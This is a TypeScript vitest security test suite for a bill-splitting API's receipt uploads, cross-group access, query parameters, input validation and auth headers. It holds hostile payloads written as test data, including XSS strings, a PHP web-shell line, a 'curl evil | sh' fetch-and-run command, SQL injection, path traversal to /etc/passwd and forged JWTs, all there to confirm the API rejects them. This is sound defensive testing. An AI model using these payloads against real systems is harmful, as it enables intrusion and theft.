import { afterAll, describe, expect, it } from "vitest";
import { api, apiBytes, cleanupGroups, makeGroup, today } from "../helpers/http";

afterAll(cleanupGroups);

const equal = (members: string[]) => ({ mode: "equal", members });
const enc = (s: string) => new TextEncoder().encode(s);
const ascii = (s: string) => [...s].map((c) => c.charCodeAt(0));
const pad = (head: number[], total: number) => {
  const b = new Uint8Array(total);
  b.set(head);
  return b;
};
const JPEG = pad([0xff, 0xd8, 0xff, 0xe0, 0, 16, ...ascii("JFIF")], 32);
const PNG = pad([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13, ...ascii("IHDR")], 40);

/** Bodies must never leak internals. */
function expectNoLeak(text: string) {
  expect(text).not.toMatch(/D1_ERROR|SQLITE|\bat \S+ \(|\bat async\b|\.ts:\d+|node_modules|stack/i);
}

async function groupWithBill(extra: Record<string, unknown> = {}) {
  const g = await makeGroup();
  const r = await api("POST", `/api/groups/${g.gid}/bills`, {
    description: "Dinner", date: today(), amount: 900, paidBy: g.ids.Alice, split: equal([g.ids.Alice, g.ids.Bob, g.ids.Carol]), ...extra,
  });
  expect(r.status, r.text).toBe(201);
  return { ...g, bid: r.json.bill.id as string };
}

const receipt = (gid: string, bid: string) => `/api/groups/${gid}/bills/${bid}/receipt`;

describe("receipt upload attacks", () => {
  it("HTML, SVG and script bytes declared as image/png -> 415, nothing stored", async () => {
    const { gid, bid } = await groupWithBill();
    const payloads: [string, Uint8Array][] = [
      ["html", enc("<!doctype html><html><body><script>alert(document.domain)</script></body></html>")],
      ["svg", enc('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(1)</script></svg>')],
      ["svg with xml prolog", enc('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>')],
      ["script", enc("<script>fetch('/api/groups').then(r=>r.text())</script>")],
      ["javascript", enc("alert(1);//")],
      ["php", enc("<?php system($_GET['c']); ?>")],
      ["shell", enc("#!/bin/sh\ncurl evil | sh\n")],
      ["pdf", enc("%PDF-1.4\n1 0 obj<</OpenAction<</S/JavaScript/JS(app.alert(1))>>>>endobj")],
      ["zip", new Uint8Array([0x50, 0x4b, 0x03, 0x04, 0, 0, 0, 0])],
      ["empty", new Uint8Array(0)],
    ];
    for (const [name, body] of payloads) {
      for (const type of ["image/png", "image/jpeg", "image/webp"]) {
        const r = await apiBytes("PUT", receipt(gid, bid), body, type);
        expect(r.status, `${name} as ${type}`).toBe(415);
        expect(r.json.error.code).toBe("unsupported_media_type");
      }
    }
    expect((await apiBytes("GET", receipt(gid, bid))).status).toBe(404);
    expect((await api("GET", `/api/groups/${gid}`)).json.bills[0].hasReceipt).toBe(false);
  });

  it("polyglots with a wrong signature are rejected (GIF89a<script>, BM, text before the magic)", async () => {
    const { gid, bid } = await groupWithBill();
    const bodies: Uint8Array[] = [
      enc("GIF89a<script>alert(1)</script>"),
      enc("GIF87a<svg onload=alert(1)>"),
      enc("BM<script>alert(1)</script>"),
      enc(" \xff\xd8\xff<script>alert(1)</script>"), // leading junk before JPEG magic
      new Uint8Array([0x0a, 0xff, 0xd8, 0xff, 0xe0, 0, 0, 0]),
      enc("RIFF\0\0\0\0WAVEfmt <script>"),
      enc("RIFF\0\0\0\0AVI <script>alert(1)</script>"),
      enc("\x89PNG\r\n"), // too short / wrong signature byte
    ];
    for (const b of bodies) {
      const r = await apiBytes("PUT", receipt(gid, bid), b, "image/png");
      expect(r.status, JSON.stringify(new TextDecoder().decode(b).slice(0, 20))).toBe(415);
    }
  });

  it("disallowed declared content types -> 415 even for a real image", async () => {
    const { gid, bid } = await groupWithBill();
    for (const ct of ["image/svg+xml", "image/gif", "text/html", "application/javascript", "application/octet-stream", "text/plain", "multipart/form-data; boundary=x", "application/json", undefined]) {
      const r = await apiBytes("PUT", receipt(gid, bid), PNG, ct);
      expect(r.status, String(ct)).toBe(415);
    }
  });

  it("oversized uploads -> 413", async () => {
    const { gid, bid } = await groupWithBill();
    const big = new Uint8Array(2 * 1024 * 1024 + 1);
    big.set([0xff, 0xd8, 0xff, 0xe0]);
    const r = await apiBytes("PUT", receipt(gid, bid), big, "image/jpeg");
    expect(r.status).toBe(413);
    expect(r.json.error.code).toBe("payload_too_large");
    const huge = new Uint8Array(5 * 1024 * 1024);
    huge.set([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
    expect((await apiBytes("PUT", receipt(gid, bid), huge, "image/png")).status).toBe(413);
    expect((await apiBytes("GET", receipt(gid, bid))).status).toBe(404);
  });

  it("a real image with trailing script bytes is served only as an inert image (nosniff + image type + sandbox CSP)", async () => {
    const { gid, bid } = await groupWithBill();
    const sneaky = new Uint8Array([...PNG, ...enc("<script>alert(1)</script>")]);
    expect((await apiBytes("PUT", receipt(gid, bid), sneaky, "image/png")).status).toBe(201);
    const got = await apiBytes("GET", receipt(gid, bid));
    expect(got.status).toBe(200);
    expect(got.headers.get("content-type")).toBe("image/png");
    expect(got.headers.get("x-content-type-options")).toBe("nosniff");
    expect(got.headers.get("content-disposition")).toBe("inline");
  });

  it("receipt responses carry a sandbox CSP and nosniff", async () => {
    const { gid, bid } = await groupWithBill();
    await apiBytes("PUT", receipt(gid, bid), JPEG, "image/jpeg");
    const got = await apiBytes("GET", receipt(gid, bid));
    expect(got.status).toBe(200);
    expect(got.headers.get("content-security-policy") ?? "").toContain("sandbox");
    expect(got.headers.get("content-security-policy") ?? "").toContain("default-src 'none'");
    expect(got.headers.get("x-content-type-options")).toBe("nosniff");
    expect(got.headers.get("x-frame-options")).toBe("DENY");
  });

  it("the declared type never decides the served type (png bytes sent as image/jpeg are served as image/png)", async () => {
    const { gid, bid } = await groupWithBill();
    await apiBytes("PUT", receipt(gid, bid), PNG, "image/jpeg");
    expect((await apiBytes("GET", receipt(gid, bid))).headers.get("content-type")).toBe("image/png");
  });

  it("path tricks in the bill id cannot reach other objects", async () => {
    const { gid } = await groupWithBill();
    for (const id of ["..", "%2e%2e", "..%2f..%2f", "%2e%2e%2f%2e%2e%2fx", "a/b", "AAAAAAAAAAAAAAAA%00", "*", "%"]) {
      for (const method of ["GET", "DELETE"]) {
        const r = await apiBytes(method, `/api/groups/${gid}/bills/${id}/receipt`);
        expect(r.status, `${method} ${id}`).toBeLessThan(500);
        expect([400, 404, 405]).toContain(r.status);
      }
      const put = await apiBytes("PUT", `/api/groups/${gid}/bills/${id}/receipt`, JPEG, "image/jpeg");
      expect(put.status, `PUT ${id}`).toBeLessThan(500);
    }
  });
});

describe("receipts: cross-group access (IDOR)", () => {
  it("another group cannot read, replace or delete a bill's receipt; the owner still can", async () => {
    const a = await groupWithBill();
    const b = await groupWithBill();
    expect((await apiBytes("PUT", receipt(a.gid, a.bid), PNG, "image/png")).status).toBe(201);

    // B asks for A's bill id under B's group
    const get = await apiBytes("GET", receipt(b.gid, a.bid));
    expect(get.status).toBe(404);
    expect(get.bytes.length).toBeLessThan(200); // an error body, not the image
    expect(get.json.error.code).toBe("not_found");
    expect((await apiBytes("PUT", receipt(b.gid, a.bid), JPEG, "image/jpeg")).status).toBe(404);
    expect((await api("DELETE", receipt(b.gid, a.bid))).status).toBe(404);
    // B's own bill has none
    expect((await apiBytes("GET", receipt(b.gid, b.bid))).status).toBe(404);
    // A's group id + B's bill id
    expect((await apiBytes("GET", receipt(a.gid, b.bid))).status).toBe(404);

    // untouched
    const still = await apiBytes("GET", receipt(a.gid, a.bid));
    expect(still.status).toBe(200);
    expect(still.bytes).toEqual(PNG);
  });

  it("restore / recurring delete / activity are group scoped too", async () => {
    const a = await groupWithBill();
    const b = await makeGroup();
    await api("DELETE", `/api/groups/${a.gid}/bills/${a.bid}`);
    expect((await api("POST", `/api/groups/${b.gid}/bills/${a.bid}/restore`, {})).status).toBe(404);
    expect((await api("GET", `/api/groups/${a.gid}`)).json.bills).toEqual([]); // still deleted

    const rec = await api("POST", `/api/groups/${a.gid}/recurring`, {
      frequency: "monthly",
      startDate: new Date(Date.now() + 5 * 86_400_000).toISOString().slice(0, 10),
      bill: { description: "R", amount: 100, paidBy: a.ids.Alice, split: equal([a.ids.Alice]) },
    });
    expect(rec.status).toBe(201);
    expect((await api("DELETE", `/api/groups/${b.gid}/recurring/${rec.json.recurring.id}`)).status).toBe(404);
    expect((await api("GET", `/api/groups/${b.gid}/recurring`)).json.recurring).toEqual([]);
    const acts = (await api("GET", `/api/groups/${b.gid}/activity`)).json.activity as { entityId: string | null }[];
    expect(acts.some((x) => x.entityId === a.bid || x.entityId === rec.json.recurring.id)).toBe(false);
  });

  it("a bill from another group cannot be used as a member in a recurring template or split", async () => {
    const a = await makeGroup();
    const b = await makeGroup();
    const foreign = b.ids.Alice;
    const bill = await api("POST", `/api/groups/${a.gid}/bills`, {
      description: "x", date: today(), amount: 100, paidBy: foreign, split: equal([a.ids.Alice]),
    });
    expect(bill.status).toBe(400);
    const rec = await api("POST", `/api/groups/${a.gid}/recurring`, {
      frequency: "weekly", startDate: today(), bill: { description: "x", amount: 100, paidBy: a.ids.Alice, split: equal([foreign]) },
    });
    expect(rec.status).toBe(400);
    const pp = await api("PATCH", `/api/groups/${a.gid}/members/${foreign}`, { promptpay: "0812345678" });
    expect(pp.status).toBe(404);
    expect((await api("GET", `/api/groups/${b.gid}`)).json.members.every((m: { promptpay: string | null }) => m.promptpay === null)).toBe(true);
  });
});

describe("activity query abuse", () => {
  it("`before` with SQL / junk -> 400, never 500", async () => {
    const { gid } = await makeGroup();
    const evil = [
      "' OR 1=1--",
      "'; SELECT 1;--",
      "2026-01-01T00:00:00Z' OR '1'='1",
      "2026-01-01T00:00:00.000Z; DELETE FROM activity",
      "1 UNION SELECT id FROM groups",
      "<script>alert(1)</script>",
      "../../etc/passwd",
      "null",
      "undefined",
      "0",
      "-1",
      "x".repeat(5000),
    ];
    for (const before of evil) {
      const r = await api("GET", `/api/groups/${gid}/activity?before=${encodeURIComponent(before)}`);
      expect(r.status, before.slice(0, 40)).toBe(400);
      expect(r.json.error.code).toBe("validation");
      expectNoLeak(r.text);
    }
    // all rows still present afterwards
    expect((await api("GET", `/api/groups/${gid}/activity`)).json.activity.length).toBeGreaterThanOrEqual(1);
  });

  it("repeated `before` params / array syntax are handled", async () => {
    const { gid } = await makeGroup();
    for (const q of ["before=a&before=b", "before[]=x", "before=2999-01-01T00:00:00.000Z&before=' OR 1=1--"]) {
      const r = await api("GET", `/api/groups/${gid}/activity?${q}`);
      expect(r.status, q).toBeLessThan(500);
    }
  });

  it("limit abuse clamps (100000, -5, 0, abc, huge digits, hex, whitespace) without 500", async () => {
    const { gid, ids } = await makeGroup();
    for (let i = 0; i < 4; i++)
      await api("POST", `/api/groups/${gid}/bills`, { description: `b${i}`, date: today(), amount: 100, paidBy: ids.Alice, split: equal([ids.Alice]) });
    const total = 5; // group.create + 4 bills
    const len = async (limit: string) => {
      const r = await api("GET", `/api/groups/${gid}/activity?limit=${limit}`);
      expect(r.status, `limit=${limit}`).toBe(200);
      expect(r.json.activity.length).toBeLessThanOrEqual(100);
      return r.json.activity.length as number;
    };
    expect(await len("100000")).toBe(total);
    expect(await len("-5")).toBe(1);
    expect(await len("-100000")).toBe(1);
    expect(await len("0")).toBe(total); // 0 -> default 50
    expect(await len("abc")).toBe(total);
    expect(await len("")).toBe(total);
    expect(await len("9".repeat(400))).toBe(total);
    expect(await len("0x10")).toBe(total);
    expect(await len("%20%20")).toBe(total);
    expect(await len("3")).toBe(3);
    expect(await len("1;DELETE")).toBe(total);
    expect(await len("1%20OR%201=1")).toBe(total);
    expect(await len("NaN")).toBe(total);
    expect(await len("Infinity")).toBe(total);
  });

  it("fractional limit (2.7) does not 500", async () => {
    const { gid } = await makeGroup();
    const r = await api("GET", `/api/groups/${gid}/activity?limit=2.7`);
    expect(r.status).toBe(200);
  });
});

describe("split / bill size abuse", () => {
  it("101 itemized items -> 400 (100 is fine)", async () => {
    const { gid, ids } = await makeGroup();
    const item = (i: number) => ({ description: `i${i}`, amount: 1, members: [ids.Alice] });
    const post = (n: number) =>
      api("POST", `/api/groups/${gid}/bills`, {
        description: "Big", date: today(), paidBy: ids.Alice, split: { mode: "itemized", items: Array.from({ length: n }, (_, i) => item(i)) },
      });
    expect((await post(100)).status).toBe(201);
    const r = await post(101);
    expect(r.status).toBe(400);
    expectNoLeak(r.text);
    expect((await post(5000)).status).toBe(413); // body > 32 KiB
  });

  it("itemized totals that exceed the amount cap -> 400, not a crash", async () => {
    const { gid, ids } = await makeGroup();
    const items = [
      { description: "a", amount: 60_000_000_000, members: [ids.Alice] },
      { description: "b", amount: 60_000_000_000, members: [ids.Bob] },
    ];
    expect((await api("POST", `/api/groups/${gid}/bills`, { description: "x", date: today(), paidBy: ids.Alice, split: { mode: "itemized", items } })).status).toBe(400);
    const near = [{ description: "a", amount: 90_000_000_000, members: [ids.Alice] }];
    const r = await api("POST", `/api/groups/${gid}/bills`, { description: "x", date: today(), paidBy: ids.Alice, split: { mode: "itemized", serviceBp: 10000, taxBp: 10000, items: near } });
    expect(r.status).toBe(400); // 90e9 * 2 * 2 = 360e9 > cap
  });

  it("weights: huge, negative, fractional, string, unsafe-integer, exponent -> 400", async () => {
    const { gid, ids } = await makeGroup();
    const weights = (w: unknown) => ({ mode: "shares", weights: [{ memberId: ids.Alice, weight: w }, { memberId: ids.Bob, weight: 1 }] });
    for (const w of [10_001, 1_000_000_000, 9_007_199_254_740_993, 1e21, -1, 0.5, "5", null, true, [], {}]) {
      const r = await api("POST", `/api/groups/${gid}/bills`, { description: "x", date: today(), amount: 1000, paidBy: ids.Alice, split: weights(w) });
      expect(r.status, JSON.stringify(w)).toBe(400);
      expectNoLeak(r.text);
    }
    // raw JSON that JS would parse as Infinity / -0
    for (const raw of ["1e999", "-0", "1E5", "10001.0"]) {
      const body = `{"description":"x","date":"${today()}","amount":1000,"paidBy":"${ids.Alice}","split":{"mode":"shares","weights":[{"memberId":"${ids.Alice}","weight":${raw}}]}}`;
      const r = await api("POST", `/api/groups/${gid}/bills`, body);
      expect(r.status, raw).toBe(400); // Infinity / out of range / all-zero weights
    }
  });

  it("max weights x max amount allocates exactly (no overflow, shares sum to the amount)", async () => {
    const { gid, ids } = await makeGroup();
    const amount = 100_000_000_000;
    const r = await api("POST", `/api/groups/${gid}/bills`, {
      description: "x", date: today(), amount, paidBy: ids.Alice,
      split: { mode: "shares", weights: [{ memberId: ids.Alice, weight: 10000 }, { memberId: ids.Bob, weight: 10000 }, { memberId: ids.Carol, weight: 9999 }] },
    });
    expect(r.status, r.text).toBe(201);
    expect(r.json.bill.shares.reduce((a: number, s: { amount: number }) => a + s.amount, 0)).toBe(amount);
    const s = (await api("GET", `/api/groups/${gid}/summary`)).json;
    expect(s.balances.reduce((a: number, b: { net: number }) => a + b.net, 0)).toBe(0);
  });

  it("percent / bp out of range or not integers -> 400", async () => {
    const { gid, ids } = await makeGroup();
    for (const bp of [10_001, -1, 1e9, 5000.5, "5000", null]) {
      const r = await api("POST", `/api/groups/${gid}/bills`, {
        description: "x", date: today(), amount: 1000, paidBy: ids.Alice,
        split: { mode: "percent", percents: [{ memberId: ids.Alice, bp }, { memberId: ids.Bob, bp: 5000 }] },
      });
      expect(r.status, String(bp)).toBe(400);
    }
  });

  it("deeply nested / oversized JSON is rejected cleanly", async () => {
    const { gid, ids } = await makeGroup();
    const url = `/api/groups/${gid}/bills`;
    const nest = (n: number) => "[".repeat(n) + "]".repeat(n);
    for (const n of [100, 3000, 10_000]) {
      const body = `{"description":"x","date":"${today()}","amount":100,"paidBy":"${ids.Alice}","split":{"mode":"equal","members":${nest(n)}}}`;
      const r = await api("POST", url, body);
      expect(r.status, `depth ${n}`).toBeLessThan(500);
      expect([400, 413]).toContain(r.status);
    }
    const obj = "{\"a\":".repeat(5000) + "1" + "}".repeat(5000);
    expect([400, 413]).toContain((await api("POST", url, obj)).status);
    // 40 KiB of members -> 413
    const big = JSON.stringify({ description: "x", date: today(), amount: 100, paidBy: ids.Alice, split: equal(Array.from({ length: 3000 }, () => ids.Alice)) });
    expect(big.length).toBeGreaterThan(32 * 1024);
    expect((await api("POST", url, big)).status).toBe(413);
    // prototype pollution style keys are inert
    const proto = `{"__proto__":{"admin":true},"description":"x","date":"${today()}","amount":100,"paidBy":"${ids.Alice}","split":{"mode":"equal","members":["${ids.Alice}"],"__proto__":{"x":1}},"constructor":{"prototype":{"y":1}}}`;
    expect((await api("POST", url, proto)).status).toBe(201);
  });
});

describe("fx rate abuse", () => {
  it("rate: exponent, NaN, negative, zero, too many decimals, too many digits, non-strings -> 400", async () => {
    const { gid, ids } = await makeGroup();
    const post = (rate: unknown, extra: Record<string, unknown> = {}) =>
      api("POST", `/api/groups/${gid}/bills`, {
        description: "x", date: today(), paidBy: ids.Alice, split: equal([ids.Alice]), fx: { currency: "EUR", amount: 1000, rate, ...extra },
      });
    for (const rate of [
      "1e9", "1E9", "1e-9", "NaN", "Infinity", "-Infinity", "-1", "-0.5", "+1", "0", "00", "0.0", "0.00000000", "0.000000001", "1.123456789",
      "1234567890", "1234567890.1", "99999999999999999999", ".5", "5.", "1,5", "0x10", "1_000", " 1", "1 ", "", "1; DROP", "<script>", 1.5, 0, -1, null, true, [], {}, ["1"],
    ]) {
      const r = await post(rate);
      expect(r.status, JSON.stringify(rate)).toBe(400);
      expectNoLeak(r.text);
    }
    expect((await post("123456789.12345678")).status).toBe(400); // converted amount exceeds the cap
    expect((await post("0.00000001")).status).toBe(400); // rounds to 0 -> amount must be >= 1
    expect((await post("1")).status).toBe(201);
    expect((await post("999999999", { amount: 1 })).status).toBe(201);
  });

  it("fx.amount / fx.currency abuse -> 400", async () => {
    const { gid, ids } = await makeGroup();
    const post = (fx: unknown) =>
      api("POST", `/api/groups/${gid}/bills`, { description: "x", date: today(), paidBy: ids.Alice, split: equal([ids.Alice]), fx });
    for (const fx of [
      { currency: "EUR", amount: 0, rate: "1" },
      { currency: "EUR", amount: -5, rate: "1" },
      { currency: "EUR", amount: 1.5, rate: "1" },
      { currency: "EUR", amount: 1e21, rate: "1" },
      { currency: "EUR", amount: 9_007_199_254_740_993, rate: "1" },
      { currency: "EUR", amount: "100", rate: "1" },
      { currency: "EUR", rate: "1" },
      { currency: "eur", amount: 100, rate: "1" },
      { currency: "EURO", amount: 100, rate: "1" },
      { currency: "E'R", amount: 100, rate: "1" },
      { currency: "USD", amount: 100, rate: "1" }, // same as group
      { amount: 100, rate: "1" },
      "EUR",
      [],
      7,
    ])
      expect((await post(fx)).status, JSON.stringify(fx)).toBe(400);
  });
});

describe("PromptPay input abuse", () => {
  it("letters, symbols, script and SQL are rejected and never stored", async () => {
    const { gid, ids } = await makeGroup();
    const url = `/api/groups/${gid}/members/${ids.Alice}`;
    for (const promptpay of [
      "08123abcd9", "abcdefghij", "<script>alert(1)</script>", "' OR 1=1--", "0812345678; DROP", "081234567", "08123456789", "+1812345678",
      "๐๘๑๒๓๔๕๖๗๘", "０８１２３４５６７８", "1".repeat(1000), 812345678, true, [], {},
    ]) {
      const r = await api("PATCH", url, { promptpay });
      expect(r.status, JSON.stringify(promptpay).slice(0, 40)).toBe(400);
      expectNoLeak(r.text);
    }
    const add = await api("POST", `/api/groups/${gid}/members`, { name: "Dave", promptpay: "<img src=x onerror=alert(1)>" });
    expect(add.status).toBe(400);
    const members = (await api("GET", `/api/groups/${gid}`)).json.members as { promptpay: string | null }[];
    expect(members.every((m) => m.promptpay === null)).toBe(true);
  });

  it("valid ids are stored as digits only", async () => {
    const { gid, ids } = await makeGroup();
    const r = await api("PATCH", `/api/groups/${gid}/members/${ids.Alice}`, { promptpay: " +66 81-234-5678 " });
    expect(r.status).toBe(200);
    expect(r.json.member.promptpay).toMatch(/^\d{10}$/);
  });
});

describe("archived groups are read-only on every endpoint", () => {
  it("members, bills, receipts, recurring and group edits are all 409 archived", async () => {
    const { gid, ids, bid } = await groupWithBill();
    await apiBytes("PUT", receipt(gid, bid), JPEG, "image/jpeg");
    const rec = await api("POST", `/api/groups/${gid}/recurring`, {
      frequency: "monthly",
      startDate: new Date(Date.now() + 5 * 86_400_000).toISOString().slice(0, 10),
      bill: { description: "R", amount: 100, paidBy: ids.Alice, split: equal([ids.Alice]) },
    });
    const rid = rec.json.recurring.id as string;
    const dead = (await api("POST", `/api/groups/${gid}/bills`, { description: "d", date: today(), amount: 100, paidBy: ids.Alice, split: equal([ids.Alice]) })).json.bill.id;
    await api("DELETE", `/api/groups/${gid}/bills/${dead}`);
    expect((await api("PATCH", `/api/groups/${gid}`, { archived: true })).status).toBe(200);

    const body = { description: "X", date: today(), amount: 100, paidBy: ids.Alice, split: equal([ids.Alice]) };
    const writes: [string, string, unknown?][] = [
      ["POST", `/api/groups/${gid}/members`, { name: "Dave" }],
      ["PATCH", `/api/groups/${gid}/members/${ids.Bob}`, { name: "Robert" }],
      ["PATCH", `/api/groups/${gid}/members/${ids.Bob}`, { promptpay: "0812345678" }],
      ["DELETE", `/api/groups/${gid}/members/${ids.Carol}`],
      ["POST", `/api/groups/${gid}/bills`, body],
      ["PUT", `/api/groups/${gid}/bills/${bid}`, body],
      ["DELETE", `/api/groups/${gid}/bills/${bid}`],
      ["POST", `/api/groups/${gid}/bills/${dead}/restore`, {}],
      ["DELETE", receipt(gid, bid)],
      ["POST", `/api/groups/${gid}/recurring`, { frequency: "weekly", startDate: today(), bill: body }],
      ["DELETE", `/api/groups/${gid}/recurring/${rid}`],
      ["PATCH", `/api/groups/${gid}`, { name: "Hacked" }],
      ["PATCH", `/api/groups/${gid}`, { currency: "EUR" }],
      ["PATCH", `/api/groups/${gid}`, { name: "Hacked", archived: true }],
    ];
    for (const [m, p, b] of writes) {
      const r = await api(m, p, b);
      expect(r.status, `${m} ${p}`).toBe(409);
      expect(r.json.error.code).toBe("archived");
    }
    const up = await apiBytes("PUT", receipt(gid, bid), PNG, "image/png");
    expect(up.status).toBe(409);
    expect(up.json.error.code).toBe("archived");
    // a body that would be invalid is still 409 (archived check first), not a validation hint
    expect((await api("POST", `/api/groups/${gid}/bills`, { nonsense: true })).status).toBe(409);

    // nothing changed
    const g = (await api("GET", `/api/groups/${gid}`)).json;
    expect(g.group.name).not.toBe("Hacked");
    expect(g.group.currency).toBe("USD");
    expect(g.members).toHaveLength(3);
    expect(g.bills).toHaveLength(1);
    expect(g.bills[0].hasReceipt).toBe(true);
    expect((await api("GET", `/api/groups/${gid}/recurring`)).json.recurring[0].active).toBe(true);
    // only unarchive (or delete) get through
    expect((await api("PATCH", `/api/groups/${gid}`, { archived: false })).status).toBe(200);
    expect((await api("POST", `/api/groups/${gid}/members`, { name: "Dave" })).status).toBe(201);
  });
});

describe("actor header handling", () => {
  const me = async (headers: Record<string, string>) => (await api("GET", "/api/me", undefined, headers)).json.actor as string | null;
  // Prod: identity comes from the verified Access JWT ("service token"); locally a junk header gives null.
  const inert = (a: string | null) => (a === null || a === "service token" || a === "dev@example.com" ? a : "<echoed>");

  it("script tags in the email header are not echoed (actor stays null / service token)", async () => {
    // (v0.4: a bad header means "no identity", so trip routes answer 401 locally — covered in v4-security.)
    for (const v of [
      "<script>alert(1)</script>@evil.io",
      "<img/src=x/onerror=alert(1)>@evil.io",
      '"><svg/onload=alert(1)>@evil.io',
      "javascript:alert(1)@evil.io",
      "a<b>@c.io",
      "{{7*7}}@evil.io",
      "${process.env.X}@evil.io",
      "x@y@z",
      "no-at-sign",
      "x".repeat(300) + "@evil.io",
      "x@" + "y".repeat(300),
    ]) {
      expect(inert(await me({ "Cf-Access-Authenticated-User-Email": v })), v.slice(0, 40)).not.toBe("<echoed>");
    }
  });

  it("a forged JWT payload cannot inject markup either", async () => {
    const b64 = (o: unknown) => Buffer.from(JSON.stringify(o)).toString("base64url");
    for (const email of ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>@evil.io", "x".repeat(3000), "a b@c.io"]) {
      const jwt = `${b64({ alg: "none" })}.${b64({ email })}.sig`;
      expect(inert(await me({ "Cf-Access-Jwt-Assertion": jwt })), email.slice(0, 40)).not.toBe("<echoed>");
    }
  });

  it("hostile actor values never end up in activity entries or bill.createdBy", async () => {
    const hostile = { "Cf-Access-Authenticated-User-Email": "<script>alert(1)</script>@evil.io" };
    const g = await api("POST", "/api/groups", { name: "Actor", currency: "USD", members: ["A", "B"] }, hostile);
    // Locally (header-based dev identity) a hostile header = no identity → 401. On prod the header is ignored.
    expect([201, 401]).toContain(g.status);
    expect(g.text).not.toContain("<script>");
    if (g.status === 401) return;
    const gid = g.json.group.id as string;
    const a = g.json.members[0].id as string;
    const bill = await api("POST", `/api/groups/${gid}/bills`, { description: "x", date: today(), amount: 100, paidBy: a, split: equal([a]) }, hostile);
    expect(bill.status).toBe(201);
    const text = JSON.stringify([(await api("GET", `/api/groups/${gid}/activity`)).json, (await api("GET", `/api/groups/${gid}`)).json]);
    expect(text).not.toContain("<script>");
    expect(text).not.toContain("evil.io");
  });

  it("valid emails are accepted, lower-cased and attributed", async () => {
    const actor = await me({ "Cf-Access-Authenticated-User-Email": "Some.One@Example.com" });
    // On prod Access sets its own identity; locally the header is used verbatim.
    expect(actor === "service token" || actor === "some.one@example.com").toBe(true);
  });
});

describe("error bodies on v2 endpoints", () => {
  it("never leak stack traces or database internals", async () => {
    const { gid, ids, bid } = await groupWithBill();
    const requests: [string, string, unknown?][] = [
      ["GET", `/api/groups/${gid}/activity?before=%27`],
      ["GET", `/api/groups/${gid}/activity?limit=%27`],
      ["POST", `/api/groups/${gid}/recurring`, { frequency: "x" }],
      ["POST", `/api/groups/${gid}/recurring`, "{"],
      ["POST", `/api/groups/${gid}/recurring`, { frequency: "weekly", startDate: "2026-13-45", bill: {} }],
      ["DELETE", `/api/groups/${gid}/recurring/${"A".repeat(16)}`],
      ["DELETE", `/api/groups/${gid}/recurring/%27`],
      ["POST", `/api/groups/${gid}/bills/${bid}/restore`, {}],
      ["POST", `/api/groups/${gid}/bills/${"A".repeat(16)}/restore`, {}],
      ["PATCH", `/api/groups/${gid}`, { archived: "yes" }],
      ["PATCH", `/api/groups/${gid}/members/${ids.Alice}`, { promptpay: "x" }],
      ["POST", `/api/groups/${gid}/bills`, { description: "x", date: today(), paidBy: ids.Alice, split: { mode: "itemized", items: "x" } }],
      ["POST", `/api/groups/${gid}/bills`, { description: "x", date: today(), amount: 1, payers: "x", split: equal([ids.Alice]) }],
      ["POST", `/api/groups/${gid}/bills`, { description: "x", date: today(), amount: 1, paidBy: ids.Alice, fx: { currency: "EUR", amount: 1, rate: "x" }, split: equal([ids.Alice]) }],
      ["GET", receipt(gid, "AAAAAAAAAAAAAAAA")],
      ["DELETE", receipt(gid, "AAAAAAAAAAAAAAAA")],
      ["GET", `/api/groups/${"A".repeat(22)}/activity`],
      ["GET", `/api/groups/%27/recurring`],
      ["DELETE", `/api/groups/${"A".repeat(22)}`],
    ];
    for (const [m, p, b] of requests) {
      const r = await api(m, p, b);
      expect(r.status, `${m} ${p}`).toBeLessThan(500);
      expectNoLeak(r.text);
      if (r.status >= 400) expect(r.json.error, `${m} ${p}`).toEqual({ code: expect.any(String), message: expect.any(String) });
    }
    const up = await apiBytes("PUT", receipt(gid, bid), enc("not an image"), "image/png");
    expect(up.status).toBe(415);
    expectNoLeak(up.text);
  });
});
